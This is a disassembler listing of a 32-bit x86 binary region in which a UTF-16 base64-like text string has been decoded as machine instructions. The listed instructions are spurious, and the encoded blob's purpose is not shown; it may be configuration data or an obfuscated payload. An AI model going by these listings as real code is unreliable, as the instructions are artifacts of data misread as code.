  40a8a6:	43                   	inc    %ebx
  40a8a7:	00 45 00             	add    %al,0x0(%ebp)
  40a8aa:	75 00                	jne    0x40a8ac
  40a8ac:	62 00                	bound  %eax,(%eax)
  40a8ae:	4c                   	dec    %esp
  40a8af:	00 4b 00             	add    %cl,0x0(%ebx)
  40a8b2:	45                   	inc    %ebp
  40a8b3:	00 55 00             	add    %dl,0x0(%ebp)
  40a8b6:	35 00 72 00 50       	xor    $0x50007200,%eax
  40a8bb:	00 72 00             	add    %dh,0x0(%edx)
  40a8be:	46                   	inc    %esi
  40a8bf:	00 32                	add    %dh,(%edx)
  40a8c1:	00 74 00 55          	add    %dh,0x55(%eax,%eax,1)
  40a8c5:	00 75 00             	add    %dh,0x0(%ebp)
  40a8c8:	74 00                	je     0x40a8ca
  40a8ca:	43                   	inc    %ebx
  40a8cb:	00 65 00             	add    %ah,0x0(%ebp)
  40a8ce:	35 00 62 00 34       	xor    $0x34006200,%eax
  40a8d3:	00 2b                	add    %ch,(%ebx)
  40a8d5:	00 6a 00             	add    %ch,0x0(%edx)
  40a8d8:	4f                   	dec    %edi
  40a8d9:	00 73 00             	add    %dh,0x0(%ebx)
  40a8dc:	34 00                	xor    $0x0,%al
  40a8de:	6d                   	insl   (%dx),%es:(%edi)
  40a8df:	00 6b 00             	add    %ch,0x0(%ebx)
  40a8e2:	66 00 31             	data16 add %dh,(%ecx)
  40a8e5:	00 4f 00             	add    %cl,0x0(%edi)
  40a8e8:	58                   	pop    %eax
  40a8e9:	00 6b 00             	add    %ch,0x0(%ebx)
  40a8ec:	34 00                	xor    $0x0,%al
  40a8ee:	33 00                	xor    (%eax),%eax
  40a8f0:	39 00                	cmp    %eax,(%eax)
  40a8f2:	73 00                	jae    0x40a8f4
  40a8f4:	79 00                	jns    0x40a8f6
  40a8f6:	45                   	inc    %ebp
  40a8f7:	00 35 00 41 00 52    	add    %dh,0x52004100
  40a8fd:	00 6e 00             	add    %ch,0x0(%esi)
  40a900:	5a                   	pop    %edx
  40a901:	00 2b                	add    %ch,(%ebx)
  40a903:	00 57 00             	add    %dl,0x0(%edi)
  40a906:	49                   	dec    %ecx
  40a907:	00 31                	add    %dh,(%ecx)
  40a909:	00 68 00             	add    %ch,0x0(%eax)
  40a90c:	33 00                	xor    (%eax),%eax
  40a90e:	4b                   	dec    %ebx
  40a90f:	00 72 00             	add    %dh,0x0(%edx)
  40a912:	48                   	dec    %eax
  40a913:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  40a917:	00 6f 00             	add    %ch,0x0(%edi)
  40a91a:	4f                   	dec    %edi
  40a91b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a91e:	75 00                	jne    0x40a920
  40a920:	6a 00                	push   $0x0
  40a922:	53                   	push   %ebx
  40a923:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  40a927:	00 62 00             	add    %ah,0x0(%edx)
  40a92a:	74 00                	je     0x40a92c
  40a92c:	5a                   	pop    %edx
  40a92d:	00 63 00             	add    %ah,0x0(%ebx)
  40a930:	4d                   	dec    %ebp
  40a931:	00 71 00             	add    %dh,0x0(%ecx)
  40a934:	5a                   	pop    %edx
  40a935:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40a939:	00 6e 00             	add    %ch,0x0(%esi)
  40a93c:	5a                   	pop    %edx
  40a93d:	00 6e 00             	add    %ch,0x0(%esi)
  40a940:	76 00                	jbe    0x40a942
  40a942:	75 00                	jne    0x40a944
  40a944:	76 00                	jbe    0x40a946
  40a946:	47                   	inc    %edi
  40a947:	00 30                	add    %dh,(%eax)
  40a949:	00 46 00             	add    %al,0x0(%esi)
  40a94c:	59                   	pop    %ecx
  40a94d:	00 6d 00             	add    %ch,0x0(%ebp)
  40a950:	33 00                	xor    (%eax),%eax
  40a952:	2b 00                	sub    (%eax),%eax
  40a954:	6f                   	outsl  %ds:(%esi),(%dx)
  40a955:	00 6b 00             	add    %ch,0x0(%ebx)
  40a958:	7a 00                	jp     0x40a95a
  40a95a:	35 00 64 00 51       	xor    $0x51006400,%eax
  40a95f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a962:	2b 00                	sub    (%eax),%eax
  40a964:	48                   	dec    %eax
  40a965:	00 46 00             	add    %al,0x0(%esi)
  40a968:	52                   	push   %edx
  40a969:	00 79 00             	add    %bh,0x0(%ecx)
  40a96c:	48                   	dec    %eax
  40a96d:	00 4a 00             	add    %cl,0x0(%edx)
  40a970:	64 00 44 00 4f       	add    %al,%fs:0x4f(%eax,%eax,1)
  40a975:	00 38                	add    %bh,(%eax)
  40a977:	00 68 00             	add    %ch,0x0(%eax)
  40a97a:	31 00                	xor    %eax,(%eax)
  40a97c:	32 00                	xor    (%eax),%al
  40a97e:	50                   	push   %eax
  40a97f:	00 75 00             	add    %dh,0x0(%ebp)
  40a982:	6f                   	outsl  %ds:(%esi),(%dx)
  40a983:	00 45 00             	add    %al,0x0(%ebp)
  40a986:	31 00                	xor    %eax,(%eax)
  40a988:	46                   	inc    %esi
  40a989:	00 62 00             	add    %ah,0x0(%edx)
  40a98c:	4f                   	dec    %edi
  40a98d:	00 33                	add    %dh,(%ebx)
  40a98f:	00 67 00             	add    %ah,0x0(%edi)
  40a992:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40a996:	73 00                	jae    0x40a998
  40a998:	59                   	pop    %ecx
  40a999:	00 71 00             	add    %dh,0x0(%ecx)
  40a99c:	68 00 71 00 69       	push   $0x69007100
  40a9a1:	00 5a 00             	add    %bl,0x0(%edx)
  40a9a4:	4c                   	dec    %esp
  40a9a5:	00 35 00 62 00 6e    	add    %dh,0x6e006200
  40a9ab:	00 31                	add    %dh,(%ecx)
  40a9ad:	00 69 00             	add    %ch,0x0(%ecx)
  40a9b0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9b1:	00 46 00             	add    %al,0x0(%esi)
  40a9b4:	6b 00 32             	imul   $0x32,(%eax),%eax
  40a9b7:	00 55 00             	add    %dl,0x0(%ebp)
  40a9ba:	38 00                	cmp    %al,(%eax)
  40a9bc:	6d                   	insl   (%dx),%es:(%edi)
  40a9bd:	00 75 00             	add    %dh,0x0(%ebp)
  40a9c0:	63 00                	arpl   %eax,(%eax)
  40a9c2:	56                   	push   %esi
  40a9c3:	00 53 00             	add    %dl,0x0(%ebx)
  40a9c6:	71 00                	jno    0x40a9c8
  40a9c8:	6a 00                	push   $0x0
  40a9ca:	48                   	dec    %eax
  40a9cb:	00 2b                	add    %ch,(%ebx)
  40a9cd:	00 41 00             	add    %al,0x0(%ecx)
  40a9d0:	66 00 39             	data16 add %bh,(%ecx)
  40a9d3:	00 59 00             	add    %bl,0x0(%ecx)
  40a9d6:	32 00                	xor    (%eax),%al
  40a9d8:	6c                   	insb   (%dx),%es:(%edi)
  40a9d9:	00 6c 00 32          	add    %ch,0x32(%eax,%eax,1)
  40a9dd:	00 47 00             	add    %al,0x0(%edi)
  40a9e0:	57                   	push   %edi
  40a9e1:	00 7a 00             	add    %bh,0x0(%edx)
  40a9e4:	41                   	inc    %ecx
  40a9e5:	00 30                	add    %dh,(%eax)
  40a9e7:	00 31                	add    %dh,(%ecx)
  40a9e9:	00 6a 00             	add    %ch,0x0(%edx)
  40a9ec:	45                   	inc    %ebp
  40a9ed:	00 4d 00             	add    %cl,0x0(%ebp)
  40a9f0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9f1:	00 56 00             	add    %dl,0x0(%esi)
  40a9f4:	49                   	dec    %ecx
  40a9f5:	00 67 00             	add    %ah,0x0(%edi)
  40a9f8:	46                   	inc    %esi
  40a9f9:	00 50 00             	add    %dl,0x0(%eax)
  40a9fc:	73 00                	jae    0x40a9fe
  40a9fe:	33 00                	xor    (%eax),%eax
  40aa00:	69 00 78 00 65 00    	imul   $0x650078,(%eax),%eax
  40aa06:	54                   	push   %esp
  40aa07:	00 48 00             	add    %cl,0x0(%eax)
  40aa0a:	4e                   	dec    %esi
  40aa0b:	00 61 00             	add    %ah,0x0(%ecx)
  40aa0e:	2b 00                	sub    (%eax),%eax
  40aa10:	43                   	inc    %ebx
  40aa11:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
  40aa15:	00 4b 00             	add    %cl,0x0(%ebx)
  40aa18:	4a                   	dec    %edx
  40aa19:	00 73 00             	add    %dh,0x0(%ebx)
  40aa1c:	55                   	push   %ebp
  40aa1d:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  40aa21:	00 53 00             	add    %dl,0x0(%ebx)
  40aa24:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40aa28:	78 00                	js     0x40aa2a
  40aa2a:	44                   	inc    %esp
  40aa2b:	00 47 00             	add    %al,0x0(%edi)
  40aa2e:	47                   	inc    %edi
  40aa2f:	00 4a 00             	add    %cl,0x0(%edx)
  40aa32:	4c                   	dec    %esp
  40aa33:	00 78 00             	add    %bh,0x0(%eax)
  40aa36:	4f                   	dec    %edi
  40aa37:	00 63 00             	add    %ah,0x0(%ebx)
  40aa3a:	56                   	push   %esi
  40aa3b:	00 58 00             	add    %bl,0x0(%eax)
  40aa3e:	6b 00 76             	imul   $0x76,(%eax),%eax
  40aa41:	00 68 00             	add    %ch,0x0(%eax)
  40aa44:	74 00                	je     0x40aa46
  40aa46:	41                   	inc    %ecx
  40aa47:	00 58 00             	add    %bl,0x0(%eax)
  40aa4a:	50                   	push   %eax
  40aa4b:	00 4b 00             	add    %cl,0x0(%ebx)
  40aa4e:	7a 00                	jp     0x40aa50
  40aa50:	53                   	push   %ebx
  40aa51:	00 72 00             	add    %dh,0x0(%edx)
  40aa54:	58                   	pop    %eax
  40aa55:	00 56 00             	add    %dl,0x0(%esi)
  40aa58:	62 00                	bound  %eax,(%eax)
  40aa5a:	6a 00                	push   $0x0
  40aa5c:	2f                   	das
  40aa5d:	00 36                	add    %dh,(%esi)
  40aa5f:	00 50 00             	add    %dl,0x0(%eax)
  40aa62:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa63:	00 77 00             	add    %dh,0x0(%edi)
  40aa66:	79 00                	jns    0x40aa68
  40aa68:	5a                   	pop    %edx
  40aa69:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40aa6d:	00 58 00             	add    %bl,0x0(%eax)
  40aa70:	2f                   	das
  40aa71:	00 58 00             	add    %bl,0x0(%eax)
  40aa74:	74 00                	je     0x40aa76
  40aa76:	54                   	push   %esp
  40aa77:	00 6a 00             	add    %ch,0x0(%edx)
  40aa7a:	35 00 59 00 69       	xor    $0x69005900,%eax
  40aa7f:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa82:	35 00 48 00 35       	xor    $0x35004800,%eax
  40aa87:	00 66 00             	add    %ah,0x0(%esi)
  40aa8a:	4f                   	dec    %edi
  40aa8b:	00 77 00             	add    %dh,0x0(%edi)
  40aa8e:	4f                   	dec    %edi
  40aa8f:	00 65 00             	add    %ah,0x0(%ebp)
  40aa92:	4f                   	dec    %edi
  40aa93:	00 5a 00             	add    %bl,0x0(%edx)
  40aa96:	57                   	push   %edi
  40aa97:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aa9a:	49                   	dec    %ecx
  40aa9b:	00 71 00             	add    %dh,0x0(%ecx)
  40aa9e:	45                   	inc    %ebp
  40aa9f:	00 55 00             	add    %dl,0x0(%ebp)
  40aaa2:	71 00                	jno    0x40aaa4
  40aaa4:	49                   	dec    %ecx
  40aaa5:	00 70 00             	add    %dh,0x0(%eax)
  40aaa8:	68 00 53 00 67       	push   $0x67005300
  40aaad:	00 78 00             	add    %bh,0x0(%eax)
  40aab0:	6e                   	outsb  %ds:(%esi),(%dx)
  40aab1:	00 2b                	add    %ch,(%ebx)
  40aab3:	00 4f 00             	add    %cl,0x0(%edi)
  40aab6:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  40aaba:	31 00                	xor    %eax,(%eax)
  40aabc:	75 00                	jne    0x40aabe
  40aabe:	59                   	pop    %ecx
  40aabf:	00 47 00             	add    %al,0x0(%edi)
  40aac2:	47                   	inc    %edi
  40aac3:	00 68 00             	add    %ch,0x0(%eax)
  40aac6:	53                   	push   %ebx
  40aac7:	00 52 00             	add    %dl,0x0(%edx)
  40aaca:	49                   	dec    %ecx
  40aacb:	00 77 00             	add    %dh,0x0(%edi)
  40aace:	53                   	push   %ebx
  40aacf:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
  40aad3:	00 39                	add    %bh,(%ecx)
  40aad5:	00 65 00             	add    %ah,0x0(%ebp)
  40aad8:	59                   	pop    %ecx
  40aad9:	00 44 00 48          	add    %al,0x48(%eax,%eax,1)
  40aadd:	00 54 00 49          	add    %dl,0x49(%eax,%eax,1)
  40aae1:	00 64 00 74          	add    %ah,0x74(%eax,%eax,1)
  40aae5:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
  40aae9:	00 6d 00             	add    %ch,0x0(%ebp)
  40aaec:	57                   	push   %edi
  40aaed:	00 59 00             	add    %bl,0x0(%ecx)
  40aaf0:	55                   	push   %ebp
  40aaf1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aaf4:	4d                   	dec    %ebp
  40aaf5:	00 78 00             	add    %bh,0x0(%eax)
  40aaf8:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40aafc:	33 00                	xor    (%eax),%eax
  40aafe:	65 00 6f 00          	add    %ch,%gs:0x0(%edi)
  40ab02:	6d                   	insl   (%dx),%es:(%edi)
  40ab03:	00 65 00             	add    %ah,0x0(%ebp)
  40ab06:	48                   	dec    %eax
  40ab07:	00 6a 00             	add    %ch,0x0(%edx)
  40ab0a:	4a                   	dec    %edx
  40ab0b:	00 62 00             	add    %ah,0x0(%edx)
  40ab0e:	61                   	popa
  40ab0f:	00 35 00 74 00 75    	add    %dh,0x75007400
  40ab15:	00 58 00             	add    %bl,0x0(%eax)
  40ab18:	58                   	pop    %eax
  40ab19:	00 59 00             	add    %bl,0x0(%ecx)
  40ab1c:	37                   	aaa
  40ab1d:	00 36                	add    %dh,(%esi)
  40ab1f:	00 35 00 6b 00 72    	add    %dh,0x72006b00
  40ab25:	00 6d 00             	add    %ch,0x0(%ebp)
  40ab28:	71 00                	jno    0x40ab2a
  40ab2a:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab2b:	00 58 00             	add    %bl,0x0(%eax)
  40ab2e:	6a 00                	push   $0x0
  40ab30:	45                   	inc    %ebp
  40ab31:	00 67 00             	add    %ah,0x0(%edi)
  40ab34:	4e                   	dec    %esi
  40ab35:	00 61 00             	add    %ah,0x0(%ecx)
  40ab38:	34 00                	xor    $0x0,%al
  40ab3a:	78 00                	js     0x40ab3c
  40ab3c:	76 00                	jbe    0x40ab3e
  40ab3e:	36 00 37             	add    %dh,%ss:(%edi)
  40ab41:	00 47 00             	add    %al,0x0(%edi)
  40ab44:	35 00 49 00 48       	xor    $0x48004900,%eax
  40ab49:	00 70 00             	add    %dh,0x0(%eax)
  40ab4c:	78 00                	js     0x40ab4e
  40ab4e:	49                   	dec    %ecx
  40ab4f:	00 5a 00             	add    %bl,0x0(%edx)
  40ab52:	61                   	popa
  40ab53:	00 49 00             	add    %cl,0x0(%ecx)
  40ab56:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab57:	00 42 00             	add    %al,0x0(%edx)
  40ab5a:	73 00                	jae    0x40ab5c
  40ab5c:	75 00                	jne    0x40ab5e
  40ab5e:	31 00                	xor    %eax,(%eax)
  40ab60:	70 00                	jo     0x40ab62
  40ab62:	48                   	dec    %eax
  40ab63:	00 4f 00             	add    %cl,0x0(%edi)
  40ab66:	41                   	inc    %ecx
  40ab67:	00 62 00             	add    %ah,0x0(%edx)
  40ab6a:	75 00                	jne    0x40ab6c
  40ab6c:	68 00 2f 00 70       	push   $0x70002f00
  40ab71:	00 45 00             	add    %al,0x0(%ebp)
  40ab74:	6b 00 69             	imul   $0x69,(%eax),%eax
  40ab77:	00 4d 00             	add    %cl,0x0(%ebp)
  40ab7a:	75 00                	jne    0x40ab7c
  40ab7c:	75 00                	jne    0x40ab7e
  40ab7e:	54                   	push   %esp
  40ab7f:	00 6f 00             	add    %ch,0x0(%edi)
  40ab82:	72 00                	jb     0x40ab84
  40ab84:	6c                   	insb   (%dx),%es:(%edi)
  40ab85:	00 35 00 4a 00 48    	add    %dh,0x48004a00
  40ab8b:	00 58 00             	add    %bl,0x0(%eax)
  40ab8e:	62 00                	bound  %eax,(%eax)
  40ab90:	67 00 6c 00          	add    %ch,0x0(%si)
  40ab94:	69 00 38 00 69 00    	imul   $0x690038,(%eax),%eax
  40ab9a:	42                   	inc    %edx
  40ab9b:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
  40ab9f:	00 44 00 58          	add    %al,0x58(%eax,%eax,1)
  40aba3:	00 61 00             	add    %ah,0x0(%ecx)
  40aba6:	79 00                	jns    0x40aba8
  40aba8:	67 00 79 00          	add    %bh,0x0(%bx,%di)
  40abac:	69 00 39 00 44 00    	imul   $0x440039,(%eax),%eax
  40abb2:	41                   	inc    %ecx
  40abb3:	00 6d 00             	add    %ch,0x0(%ebp)
  40abb6:	7a 00                	jp     0x40abb8
  40abb8:	5a                   	pop    %edx
  40abb9:	00 31                	add    %dh,(%ecx)
  40abbb:	00 68 00             	add    %ch,0x0(%eax)
  40abbe:	56                   	push   %esi
  40abbf:	00 38                	add    %bh,(%eax)
  40abc1:	00 38                	add    %bh,(%eax)
  40abc3:	00 4a 00             	add    %cl,0x0(%edx)
  40abc6:	36 00 44 00 2b       	add    %al,%ss:0x2b(%eax,%eax,1)
  40abcb:	00 33                	add    %dh,(%ebx)
  40abcd:	00 48 00             	add    %cl,0x0(%eax)
  40abd0:	46                   	inc    %esi
  40abd1:	00 4a 00             	add    %cl,0x0(%edx)
  40abd4:	63 00                	arpl   %eax,(%eax)
  40abd6:	32 00                	xor    (%eax),%al
  40abd8:	71 00                	jno    0x40abda
  40abda:	41                   	inc    %ecx
  40abdb:	00 55 00             	add    %dl,0x0(%ebp)
  40abde:	74 00                	je     0x40abe0
  40abe0:	74 00                	je     0x40abe2
  40abe2:	79 00                	jns    0x40abe4
  40abe4:	2f                   	das
  40abe5:	00 35 00 7a 00 58    	add    %dh,0x58007a00
  40abeb:	00 51 00             	add    %dl,0x0(%ecx)
  40abee:	38 00                	cmp    %al,(%eax)
  40abf0:	48                   	dec    %eax
  40abf1:	00 56 00             	add    %dl,0x0(%esi)
  40abf4:	79 00                	jns    0x40abf6
  40abf6:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40abfa:	50                   	push   %eax
  40abfb:	00 4b 00             	add    %cl,0x0(%ebx)
  40abfe:	7a 00                	jp     0x40ac00
  40ac00:	4e                   	dec    %esi
  40ac01:	00 5a 00             	add    %bl,0x0(%edx)
  40ac04:	33 00                	xor    (%eax),%eax
  40ac06:	51                   	push   %ecx
  40ac07:	00 78 00             	add    %bh,0x0(%eax)
  40ac0a:	6d                   	insl   (%dx),%es:(%edi)
  40ac0b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ac0e:	34 00                	xor    $0x0,%al
  40ac10:	45                   	inc    %ebp
  40ac11:	00 59 00             	add    %bl,0x0(%ecx)
  40ac14:	66 00 46 00          	data16 add %al,0x0(%esi)
  40ac18:	66 00 70 00          	data16 add %dh,0x0(%eax)
  40ac1c:	4d                   	dec    %ebp
  40ac1d:	00 4c 00 59          	add    %cl,0x59(%eax,%eax,1)
  40ac21:	00 64 00 38          	add    %ah,0x38(%eax,%eax,1)
  40ac25:	00 69 00             	add    %ch,0x0(%ecx)
  40ac28:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac29:	00 46 00             	add    %al,0x0(%esi)
  40ac2c:	62 00                	bound  %eax,(%eax)
  40ac2e:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40ac32:	6b 00 53             	imul   $0x53,(%eax),%eax
  40ac35:	00 49 00             	add    %cl,0x0(%ecx)
  40ac38:	6a 00                	push   $0x0
  40ac3a:	79 00                	jns    0x40ac3c
  40ac3c:	32 00                	xor    (%eax),%al
  40ac3e:	6d                   	insl   (%dx),%es:(%edi)
  40ac3f:	00 32                	add    %dh,(%edx)
  40ac41:	00 78 00             	add    %bh,0x0(%eax)
  40ac44:	6d                   	insl   (%dx),%es:(%edi)
  40ac45:	00 4e 00             	add    %cl,0x0(%esi)
  40ac48:	72 00                	jb     0x40ac4a
  40ac4a:	71 00                	jno    0x40ac4c
  40ac4c:	4a                   	dec    %edx
  40ac4d:	00 6b 00             	add    %ch,0x0(%ebx)
  40ac50:	79 00                	jns    0x40ac52
  40ac52:	79 00                	jns    0x40ac54
  40ac54:	73 00                	jae    0x40ac56
  40ac56:	73 00                	jae    0x40ac58
  40ac58:	43                   	inc    %ebx
  40ac59:	00 6e 00             	add    %ch,0x0(%esi)
  40ac5c:	71 00                	jno    0x40ac5e
  40ac5e:	63 00                	arpl   %eax,(%eax)
  40ac60:	73 00                	jae    0x40ac62
  40ac62:	2b 00                	sub    (%eax),%eax
  40ac64:	53                   	push   %ebx
  40ac65:	00 6f 00             	add    %ch,0x0(%edi)
  40ac68:	77 00                	ja     0x40ac6a
  40ac6a:	71 00                	jno    0x40ac6c
  40ac6c:	58                   	pop    %eax
  40ac6d:	00 67 00             	add    %ah,0x0(%edi)
  40ac70:	52                   	push   %edx
  40ac71:	00 65 00             	add    %ah,0x0(%ebp)
  40ac74:	52                   	push   %edx
  40ac75:	00 46 00             	add    %al,0x0(%esi)
  40ac78:	63 00                	arpl   %eax,(%eax)
  40ac7a:	34 00                	xor    $0x0,%al
  40ac7c:	39 00                	cmp    %eax,(%eax)
  40ac7e:	36 00 4a 00          	add    %cl,%ss:0x0(%edx)
  40ac82:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40ac86:	41                   	inc    %ecx
  40ac87:	00 5a 00             	add    %bl,0x0(%edx)
  40ac8a:	39 00                	cmp    %eax,(%eax)
  40ac8c:	47                   	inc    %edi
  40ac8d:	00 56 00             	add    %dl,0x0(%esi)
  40ac90:	70 00                	jo     0x40ac92
  40ac92:	2f                   	das
  40ac93:	00 67 00             	add    %ah,0x0(%edi)
  40ac96:	62 00                	bound  %eax,(%eax)
  40ac98:	39 00                	cmp    %eax,(%eax)
  40ac9a:	75 00                	jne    0x40ac9c
  40ac9c:	61                   	popa
  40ac9d:	00 41 00             	add    %al,0x0(%ecx)
  40aca0:	6a 00                	push   $0x0
  40aca2:	76 00                	jbe    0x40aca4
  40aca4:	31 00                	xor    %eax,(%eax)
  40aca6:	4d                   	dec    %ebp
  40aca7:	00 4a 00             	add    %cl,0x0(%edx)
  40acaa:	44                   	inc    %esp
  40acab:	00 6f 00             	add    %ch,0x0(%edi)
  40acae:	66 00 50 00          	data16 add %dl,0x0(%eax)
  40acb2:	34 00                	xor    $0x0,%al
  40acb4:	77 00                	ja     0x40acb6
  40acb6:	2f                   	das
  40acb7:	00 57 00             	add    %dl,0x0(%edi)
  40acba:	7a 00                	jp     0x40acbc
  40acbc:	62 00                	bound  %eax,(%eax)
  40acbe:	46                   	inc    %esi
  40acbf:	00 4a 00             	add    %cl,0x0(%edx)
  40acc2:	37                   	aaa
  40acc3:	00 70 00             	add    %dh,0x0(%eax)
  40acc6:	7a 00                	jp     0x40acc8
  40acc8:	4a                   	dec    %edx
  40acc9:	00 52 00             	add    %dl,0x0(%edx)
  40accc:	36 00 77 00          	add    %dh,%ss:0x0(%edi)
  40acd0:	6c                   	insb   (%dx),%es:(%edi)
  40acd1:	00 33                	add    %dh,(%ebx)
  40acd3:	00 69 00             	add    %ch,0x0(%ecx)
  40acd6:	49                   	dec    %ecx
  40acd7:	00 72 00             	add    %dh,0x0(%edx)
  40acda:	37                   	aaa
  40acdb:	00 35 00 50 00 30    	add    %dh,0x30005000
  40ace1:	00 2b                	add    %ch,(%ebx)
  40ace3:	00 52 00             	add    %dl,0x0(%edx)
  40ace6:	46                   	inc    %esi
  40ace7:	00 39                	add    %bh,(%ecx)
  40ace9:	00 62 00             	add    %ah,0x0(%edx)
  40acec:	75 00                	jne    0x40acee
  40acee:	31 00                	xor    %eax,(%eax)
  40acf0:	6e                   	outsb  %ds:(%esi),(%dx)
  40acf1:	00 72 00             	add    %dh,0x0(%edx)
  40acf4:	42                   	inc    %edx
  40acf5:	00 75 00             	add    %dh,0x0(%ebp)
  40acf8:	43                   	inc    %ebx
  40acf9:	00 41 00             	add    %al,0x0(%ecx)
  40acfc:	37                   	aaa
  40acfd:	00 39                	add    %bh,(%ecx)
  40acff:	00 67 00             	add    %ah,0x0(%edi)
  40ad02:	58                   	pop    %eax
  40ad03:	00 46 00             	add    %al,0x0(%esi)
  40ad06:	42                   	inc    %edx
  40ad07:	00 39                	add    %bh,(%ecx)
  40ad09:	00 79 00             	add    %bh,0x0(%ecx)
  40ad0c:	2b 00                	sub    (%eax),%eax
  40ad0e:	71 00                	jno    0x40ad10
  40ad10:	47                   	inc    %edi
  40ad11:	00 4b 00             	add    %cl,0x0(%ebx)
  40ad14:	34 00                	xor    $0x0,%al
  40ad16:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad17:	00 72 00             	add    %dh,0x0(%edx)
  40ad1a:	2f                   	das
  40ad1b:	00 67 00             	add    %ah,0x0(%edi)
  40ad1e:	6b 00 47             	imul   $0x47,(%eax),%eax
  40ad21:	00 65 00             	add    %ah,0x0(%ebp)
  40ad24:	71 00                	jno    0x40ad26
  40ad26:	77 00                	ja     0x40ad28
  40ad28:	73 00                	jae    0x40ad2a
  40ad2a:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
  40ad2e:	32 00                	xor    (%eax),%al
  40ad30:	74 00                	je     0x40ad32
  40ad32:	73 00                	jae    0x40ad34
  40ad34:	36 00 77 00          	add    %dh,%ss:0x0(%edi)
  40ad38:	74 00                	je     0x40ad3a
  40ad3a:	72 00                	jb     0x40ad3c
  40ad3c:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad3d:	00 64 00 4b          	add    %ah,0x4b(%eax,%eax,1)
  40ad41:	00 42 00             	add    %al,0x0(%edx)
  40ad44:	45                   	inc    %ebp
  40ad45:	00 2b                	add    %ch,(%ebx)
  40ad47:	00 46 00             	add    %al,0x0(%esi)
  40ad4a:	75 00                	jne    0x40ad4c
  40ad4c:	34 00                	xor    $0x0,%al
  40ad4e:	2f                   	das
  40ad4f:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  40ad53:	00 6e 00             	add    %ch,0x0(%esi)
  40ad56:	68 00 70 00 42       	push   $0x42007000
  40ad5b:	00 63 00             	add    %ah,0x0(%ebx)
  40ad5e:	35 00 4a 00 67       	xor    $0x67004a00,%eax
  40ad63:	00 4b 00             	add    %cl,0x0(%ebx)
  40ad66:	32 00                	xor    (%eax),%al
  40ad68:	6a 00                	push   $0x0
  40ad6a:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40ad6e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad6f:	00 6c 00 32          	add    %ch,0x32(%eax,%eax,1)
  40ad73:	00 78 00             	add    %bh,0x0(%eax)
  40ad76:	58                   	pop    %eax
  40ad77:	00 50 00             	add    %dl,0x0(%eax)
  40ad7a:	69 00 6e 00 6b 00    	imul   $0x6b006e,(%eax),%eax
  40ad80:	4d                   	dec    %ebp
  40ad81:	00 67 00             	add    %ah,0x0(%edi)
  40ad84:	6d                   	insl   (%dx),%es:(%edi)
  40ad85:	00 6a 00             	add    %ch,0x0(%edx)
  40ad88:	34 00                	xor    $0x0,%al
  40ad8a:	79 00                	jns    0x40ad8c
  40ad8c:	4c                   	dec    %esp
  40ad8d:	00 6e 00             	add    %ch,0x0(%esi)
  40ad90:	4a                   	dec    %edx
  40ad91:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40ad95:	00 79 00             	add    %bh,0x0(%ecx)
  40ad98:	56                   	push   %esi
  40ad99:	00 33                	add    %dh,(%ebx)
  40ad9b:	00 43 00             	add    %al,0x0(%ebx)
  40ad9e:	41                   	inc    %ecx
  40ad9f:	00 6f 00             	add    %ch,0x0(%edi)
  40ada2:	73 00                	jae    0x40ada4
  40ada4:	44                   	inc    %esp
  40ada5:	00 6d 00             	add    %ch,0x0(%ebp)
  40ada8:	62 00                	bound  %eax,(%eax)
  40adaa:	74 00                	je     0x40adac
  40adac:	46                   	inc    %esi
  40adad:	00 45 00             	add    %al,0x0(%ebp)
  40adb0:	42                   	inc    %edx
  40adb1:	00 54 00 75          	add    %dl,0x75(%eax,%eax,1)
  40adb5:	00 64 00 59          	add    %ah,0x59(%eax,%eax,1)
  40adb9:	00 38                	add    %bh,(%eax)
  40adbb:	00 6d 00             	add    %ch,0x0(%ebp)
  40adbe:	32 00                	xor    (%eax),%al
  40adc0:	35 00 4d 00 30       	xor    $0x30004d00,%eax
  40adc5:	00 30                	add    %dh,(%eax)
  40adc7:	00 4b 00             	add    %cl,0x0(%ebx)
  40adca:	65 00 5a 00          	add    %bl,%gs:0x0(%edx)
  40adce:	4b                   	dec    %ebx
  40adcf:	00 72 00             	add    %dh,0x0(%edx)
  40add2:	69 00 45 00 2b 00    	imul   $0x2b0045,(%eax),%eax
  40add8:	79 00                	jns    0x40adda
  40adda:	4f                   	dec    %edi
  40addb:	00 30                	add    %dh,(%eax)
  40addd:	00 4c 00 46          	add    %cl,0x46(%eax,%eax,1)
  40ade1:	00 70 00             	add    %dh,0x0(%eax)
  40ade4:	39 00                	cmp    %eax,(%eax)
  40ade6:	78 00                	js     0x40ade8
  40ade8:	47                   	inc    %edi
  40ade9:	00 46 00             	add    %al,0x0(%esi)
  40adec:	54                   	push   %esp
  40aded:	00 35 00 31 00 72    	add    %dh,0x72003100
